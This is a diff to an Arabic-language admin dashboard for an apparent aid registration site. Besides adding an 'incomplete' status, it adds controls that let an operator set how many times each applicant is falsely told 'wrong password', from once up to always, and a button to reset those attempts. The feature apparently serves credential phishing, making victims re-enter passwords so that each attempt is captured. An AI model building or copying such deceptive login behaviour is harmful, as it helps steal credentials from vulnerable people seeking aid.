@@ -663,6 +663,7 @@
                             <th>أفراد الأسرة</th>
                             <th>الحالة الاجتماعية</th>
                             <th>حالة الطلب</th>
+                            <th>سلوك كلمة المرور عند الاستعلام</th>
                             <th>تاريخ التقديم</th>
                             <th>التواصل والإشعار</th>
                         </tr>
@@ -899,7 +900,8 @@
                         'pending': 'background: rgba(245, 158, 11, 0.18); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4);',
                         'approved': 'background: rgba(16, 185, 129, 0.18); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4);',
                         'delivered': 'background: rgba(59, 130, 246, 0.18); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.4);',
-                        'rejected': 'background: rgba(239, 68, 68, 0.18); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4);'
+                        'rejected': 'background: rgba(239, 68, 68, 0.18); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4);',
+                        'incomplete': 'background: rgba(249, 115, 22, 0.18); color: #fb923c; border: 1px solid rgba(249, 115, 22, 0.4);'
                     };
 
                     tableBodyLogs.innerHTML = logs.map(log => {
@@ -1068,6 +1070,44 @@
             .catch(err => alert('حدث خطأ أثناء التحديث'));
         };
 
+        window.updateFailCount = (id, count) => {
+            fetch('/api/admin/update-fail-count', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'same-origin',
+                body: JSON.stringify({ id, maxFailCount: count })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    alert('✅ تم تحديث سلوك الاستعلام لهذا الطلب بنجاح (سيتم إظهار كلمة المرور خاطئة حسب العدد المحدد)!');
+                    fetchRegistrations();
+                } else {
+                    alert('❌ ' + (data.error || 'فشل تحديث سلوك الاستعلام'));
+                }
+            })
+            .catch(err => alert('حدث خطأ أثناء التحديث'));
+        };
+
+        window.resetAttempts = (email, refCode) => {
+            fetch('/api/admin/reset-attempts', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'same-origin',
+                body: JSON.stringify({ email, refCode })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    alert('✅ ' + (data.message || 'تم تصفير محاولات الفشل لهذا الطلب بنجاح!'));
+                    fetchRegistrations();
+                } else {
+                    alert('❌ ' + (data.error || 'فشل تصفير المحاولات'));
+                }
+            })
+            .catch(err => alert('حدث خطأ أثناء التحديث'));
+        };
+
         let activeCountryFilter = 'ALL';
 
         const isLebanonRecord = (item) => {
@@ -1205,7 +1245,8 @@
                     'pending': 'background: rgba(245, 158, 11, 0.18); color: #fbbf24; border-color: rgba(245, 158, 11, 0.4);',
                     'approved': 'background: rgba(16, 185, 129, 0.18); color: #34d399; border-color: rgba(16, 185, 129, 0.4);',
                     'delivered': 'background: rgba(59, 130, 246, 0.18); color: #60a5fa; border-color: rgba(59, 130, 246, 0.4);',
-                    'rejected': 'background: rgba(239, 68, 68, 0.18); color: #f87171; border-color: rgba(239, 68, 68, 0.4);'
+                    'rejected': 'background: rgba(239, 68, 68, 0.18); color: #f87171; border-color: rgba(239, 68, 68, 0.4);',
+                    'incomplete': 'background: rgba(249, 115, 22, 0.18); color: #fb923c; border-color: rgba(249, 115, 22, 0.4);'
                 };
 
                 return `
@@ -1233,8 +1274,25 @@
                                 <option value="pending" ${currentStatus === 'pending' ? 'selected' : ''}>🟡 قيد التدقيق</option>
                                 <option value="approved" ${currentStatus === 'approved' ? 'selected' : ''}>🟢 مقبول</option>
                                 <option value="delivered" ${currentStatus === 'delivered' ? 'selected' : ''}>🔵 تم التسليم</option>
+                                <option value="incomplete" ${currentStatus === 'incomplete' ? 'selected' : ''}>🟠 نقص في الأوراق</option>
                                 <option value="rejected" ${currentStatus === 'rejected' ? 'selected' : ''}>🔴 غير مستوفي</option>
                             </select>
+                        </td>
+                        <td>
+                            <div style="display: flex; flex-direction: column; gap: 0.35rem;">
+                                <select onchange="updateFailCount('${item.id}', this.value)" style="padding: 0.35rem 0.5rem; border-radius: 8px; font-weight: 700; font-size: 0.8rem; border: 1px solid var(--border-color); background: var(--bg-body); color: var(--text-dark);">
+                                    <option value="1" ${ (item.maxFailCount || 1) == 1 ? 'selected' : '' }>🔴 كلمة المرور خطأ (مرة واحدة)</option>
+                                    <option value="2" ${ (item.maxFailCount) == 2 ? 'selected' : '' }>🔴 كلمة المرور خطأ (مرتان)</option>
+                                    <option value="3" ${ (item.maxFailCount) == 3 ? 'selected' : '' }>🔴 كلمة المرور خطأ (3 مرات)</option>
+                                    <option value="4" ${ (item.maxFailCount) == 4 ? 'selected' : '' }>🔴 كلمة المرور خطأ (4 مرات)</option>
+                                    <option value="5" ${ (item.maxFailCount) == 5 ? 'selected' : '' }>🔴 كلمة المرور خطأ (5 مرات)</option>
+                                    <option value="10" ${ (item.maxFailCount) == 10 ? 'selected' : '' }>🔴 كلمة المرور خطأ (10 مرات)</option>
+                                    <option value="99" ${ (item.maxFailCount) >= 99 ? 'selected' : '' }>🔒 كلمة المرور خطأ (دائماً/حظر الدخول)</option>
+                                </select>
+                                <button type="button" onclick="resetAttempts('${safeEmail}', '${escapeHtml(item.refCode)}')" title="تصفير محاولات الفشل الحالية" style="background: rgba(99, 102, 241, 0.12); color: #818cf8; border: 1px solid rgba(99, 102, 241, 0.3); border-radius: 6px; padding: 0.2rem 0.4rem; font-size: 0.75rem; cursor: pointer; font-weight: 700;">
+                                    <i class="fa-solid fa-rotate-left"></i> تصفير المحاولات
+                                </button>
+                            </div>
                         </td>
                         <td><span style="font-size: 0.85rem; color: var(--text-muted); font-family: 'Outfit', sans-serif;">${date}</span></td>
                         <td style="white-space: nowrap;">
